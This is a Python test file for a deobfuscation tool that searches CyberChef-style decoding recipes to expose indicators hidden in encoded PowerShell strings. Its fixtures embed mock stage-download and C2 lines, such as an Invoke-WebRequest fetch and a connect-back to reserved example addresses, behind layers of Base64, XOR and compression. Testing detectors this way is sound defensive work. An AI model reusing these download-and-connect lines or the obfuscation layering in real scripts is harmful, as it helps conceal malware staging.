"""PlagMagic: CyberChef-style recipe search over encoded runs.

Every payload is the same inert banner on reserved documentation addresses.
Each recipe step must be a real CyberChef operation, since the dashboard opens
the recipe in CyberChef and expects the same output there.
"""
import base64
import bz2
import codecs
import gzip
import json
import lzma
import zlib
from urllib.parse import unquote

import pytest

from plaguardsv2.GuardModules import PlagDeobfus, PlagEncode, PlagGrep, PlagMagic, PlagTrace

PAYLOAD = b"[INERT] C2=malicious.example.invalid http://198.51.100.42/stage.ps1"
TEXT = PAYLOAD.decode()
MARK = "malicious.example.invalid"


def _xor(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def _raw_deflate(data: bytes) -> bytes:
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    return c.compress(data) + c.flush()


def _base58(data: bytes) -> str:
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    n, out = int.from_bytes(data, "big"), ""
    while n:
        n, r = divmod(n, 58)
        out = alphabet[r] + out
    return out


def _rot47(text: str) -> str:
    return "".join(chr(33 + (ord(c) - 33 + 47) % 94) if 33 <= ord(c) <= 126 else c for c in text)


ENCODED = [
    ("base64", base64.b64encode(PAYLOAD).decode(), "From Base64"),
    ("base64url", base64.urlsafe_b64encode(PAYLOAD + b" ???>>>").decode(), "From Base64"),
    ("base32", base64.b32encode(PAYLOAD).decode(), "From Base32"),
    ("base32-lower", base64.b32encode(PAYLOAD).decode().lower(), "From Base32"),
    ("base85", base64.a85encode(PAYLOAD, adobe=True).decode(), "From Base85"),
    ("base58", _base58(PAYLOAD), "From Base58"),
    ("hex", PAYLOAD.hex(), "From Hex"),
    ("hex-0x-list", ",".join(f"0x{b:02x}" for b in PAYLOAD), "From Hex"),
    ("decimal", ",".join(str(b) for b in PAYLOAD), "From Decimal"),
    ("octal", " ".join(f"{b:03o}" for b in PAYLOAD), "From Octal"),
    ("binary", " ".join(f"{b:08b}" for b in PAYLOAD), "From Binary"),
    ("url", "".join(f"%{b:02X}" for b in PAYLOAD), "URL Decode"),
    ("html-entity", "".join(f"&#{b};" for b in PAYLOAD), "From HTML Entity"),
    ("quoted-printable", "".join(f"={b:02X}" for b in PAYLOAD), "From Quoted Printable"),
    ("rot13", codecs.encode(TEXT, "rot13"), "ROT13"),
    ("rot47", _rot47(TEXT), "ROT47"),
    ("reversed-base64", base64.b64encode(PAYLOAD).decode()[::-1], "Reverse > From Base64"),
    ("gzip", base64.b64encode(gzip.compress(PAYLOAD, mtime=0)).decode(), "From Base64 > Gunzip"),
    ("zlib", base64.b64encode(zlib.compress(PAYLOAD)).decode(), "From Base64 > Zlib Inflate"),
    ("raw-deflate", base64.b64encode(_raw_deflate(PAYLOAD)).decode(), "From Base64 > Raw Inflate"),
    ("bzip2", base64.b64encode(bz2.compress(PAYLOAD)).decode(), "From Base64 > Bzip2 Decompress"),
    ("lzma", base64.b64encode(lzma.compress(PAYLOAD, format=lzma.FORMAT_ALONE)).decode(),
     "From Base64 > LZMA Decompress"),
    ("utf16le", base64.b64encode(TEXT.encode("utf-16-le")).decode(), "From Base64 > Decode UTF-16LE"),
    ("xor", base64.b64encode(_xor(PAYLOAD, 0x5B)).decode(), "From Base64 > XOR key 0x5b"),
    ("three-layers", base64.b32encode(base64.b64encode(gzip.compress(PAYLOAD, mtime=0))).decode(),
     "From Base32 > From Base64 > Gunzip"),
]


@pytest.mark.parametrize("name,encoded,recipe", ENCODED, ids=[c[0] for c in ENCODED])
def test_recipe_is_found(name, encoded, recipe):
    result = PlagMagic.magic(encoded)
    assert result is not None, f"{name}: no recipe"
    assert MARK in result.output
    assert result.label == recipe


NOT_ENCODED = [
    ("identifier", "ThisIsAVeryLongVariableNameForTesting"),
    ("sha256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
    ("md5", "d41d8cd98f00b204e9800998ecf8427e"),
    ("bitcoin-address", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
    ("prose", "The quick brown fox jumps over the lazy dog again"),
    ("binary-noise", base64.b64encode(bytes(range(7, 250, 3))).decode()),
    ("guid", "6F9619FF-8B86-D011-B42D-00C04FC964FF"),
    ("path", "C:/Windows/System32/WindowsPowerShell/v1.0"),
    ("numbers", "1000 2000 3000 4000 5000"),
    ("code", "$x = [Convert]::ToInt32($y, 16); Write-Host $x"),
    ("separator-rule", "-" * 50),
    ("version-list", "10.0.19041.1 10.0.22621.2 6.1.7601.3"),
]


@pytest.mark.parametrize("name,value", NOT_ENCODED, ids=[c[0] for c in NOT_ENCODED])
def test_ordinary_values_get_no_recipe(name, value):
    assert PlagMagic.magic(value) is None


def test_xor_needs_more_than_a_dotted_number():
    """Palette bytes from Pillow's source XOR to `4,95,;7.40.51.73` under key
    0x23. One IP-shaped crib in otherwise wordless output is chance, not a stage."""
    palette = r"\x17\x0f\x1a\x16\x0f\x18\x14\x0d\x17\x13\x0d\x16\x12\x0d\x14\x10"
    assert PlagMagic.magic(palette) is None


def test_a_decompression_bomb_is_capped():
    bomb = base64.b64encode(gzip.compress(b"A" * 20_000_000, mtime=0)).decode()
    assert PlagMagic.magic(bomb) is None or len(PlagMagic.magic(bomb).output) <= PlagMagic.MAX_OUTPUT_LEN


def test_recipe_is_cyberchef_json_with_full_arguments():
    result = PlagMagic.magic(base64.b64encode(gzip.compress(PAYLOAD, mtime=0)).hex())
    assert result.recipe() == [
        {"op": "From Hex", "args": ["Auto"]},
        {"op": "From Base64", "args": ["A-Za-z0-9+/=", True, False]},
        {"op": "Gunzip", "args": []},
    ]


def test_cyberchef_fragment_survives_its_parameter_parser():
    """CyberChef splits on `&` and `=` and turns `+` into a space before
    decoding, so the fragment must escape all three."""
    data = "a+b=c&d/=="
    fragment = PlagMagic.chef_fragment(data, [{"op": "ROT13", "args": [True, True, False, 13]}])
    params = {}
    for part in fragment.split("&"):
        key, value = part.split("=")  # exactly one '=' each, as CyberChef requires
        params[key] = unquote(value.replace("+", " "))
    assert json.loads(params["recipe"])[0]["op"] == "ROT13"
    assert base64.b64decode(params["input"]).decode() == data


def test_fragment_without_recipe_runs_cyberchef_magic():
    fragment = PlagMagic.chef_fragment("abc")
    assert json.loads(unquote(fragment.split("&")[0].split("=")[1]))[0]["op"] == "Magic"


def test_oversized_input_is_left_out_of_the_link():
    fragment = PlagMagic.chef_fragment("A" * (PlagMagic.MAX_LINK_INPUT + 1))
    assert "&input=" not in fragment


# Through the engine

def _script() -> str:
    return "\n".join([
        "$a = '" + base64.b32encode(b"$u = 'http://stage-a.example.invalid/one.ps1'").decode() + "'",
        "$b = '" + base64.b64encode(_xor(b"connect 198.51.100.77 port 8443", 0x4D)).decode() + "'",
        "$c = '" + base64.b64encode(gzip.compress(b"Invoke-WebRequest http://stage-c.example.invalid/c.bin",
                                                  mtime=0)).hex() + "'",
        "$d = '" + codecs.encode("http://stage-d.example.invalid/d.hta", "rot13") + "'",
        "Write-Host $a $b $c $d",
    ])


def test_engine_recovers_stages_no_dedicated_pass_handles():
    result = PlagDeobfus.run(_script())
    traced = PlagTrace.trace(result.deobfuscated)
    values = {f.value for f in PlagGrep.scan(result.original, result.deobfuscated,
                                             PlagTrace.enrichment_text(traced))}
    assert {"http://stage-a.example.invalid/one.ps1", "http://stage-c.example.invalid/c.bin",
            "http://stage-d.example.invalid/d.hta", "198.51.100.77"} <= values
    assert any("CyberChef-style recipe" in entry for entry in result.pass_log)
    assert result.converged


def test_decoded_runs_are_not_reported_as_still_encoded():
    assert PlagDeobfus.run(_script()).residual_blobs == []


def test_recipe_annotation_is_not_repeated_on_later_rounds():
    out = PlagDeobfus.run(_script()).deobfuscated
    assert out.count("# [recipe: From Base32]") == 1


def test_recipe_search_runs_only_after_the_dedicated_passes():
    """A FromBase64String call is the dedicated pass's job; the generic search
    must not claim it first."""
    b64 = base64.b64encode(b"Write-Host 'malicious.example.invalid'").decode()
    log = PlagDeobfus.run(
        f"$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64}'))").pass_log
    assert any("FromBase64String" in entry for entry in log)
    assert not any("CyberChef-style recipe" in entry for entry in log)


def test_a_resolved_variable_shows_its_recipe_not_printable_garbage():
    """Printable is not readable: XOR'd text passes a printable check, so the
    plain Base64 reading used to be shown as the decoded value."""
    how, text = PlagEncode.decode_payload(
        base64.b64encode(_xor(b"connect 198.51.100.77 port 8443", 0x4D)).decode())
    assert how == "Base64 > XOR key 0x4d"
    assert "198.51.100.77" in text


def test_survey_does_not_list_hashes_or_wallets_as_still_encoded():
    script = "\n".join([
        "$h = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'",
        "$s = 'da39a3ee5e6b4b0d3255bfef95601890afd80709'",
        "$w = '0xdEaD000000000000000000000000000000000000'",
    ])
    assert PlagMagic.survey(script) == []


def test_survey_lists_unopened_blobs_for_an_analyst():
    blob = base64.b64encode(bytes(range(256)) * 2).decode()
    rows = PlagMagic.survey(f"$k = '{blob}'")
    assert rows and rows[0][1] is None
